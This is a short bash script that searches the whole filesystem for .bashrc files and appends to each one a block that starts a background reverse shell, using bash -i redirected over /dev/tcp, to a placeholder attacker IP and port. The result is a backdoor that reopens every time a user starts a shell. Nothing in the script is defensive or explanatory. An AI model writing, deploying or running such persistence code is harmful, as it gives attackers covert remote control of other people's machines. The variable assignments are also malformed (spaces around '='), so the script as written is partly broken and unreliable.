#!/bin/bash

ip = IPGOESHERE
port = PORTGOESHERE

sudo find / -type f -name ".bashrc" | while read file; do
  if ! grep -q "TSP" "$file" && ! grep -q "$ip" "$file" && ! grep -q "$port" "$file"; then
	echo -e "if [ -z "$TSP" ]; then \n  export TSP=1\n  ( bash -i >& /dev/tcp/$ip/$port 0>&1 ) 2>/dev/null & disown\n  sleep 0.1\nfi" | sudo tee -a "$file" > /dev/null
  fi
done
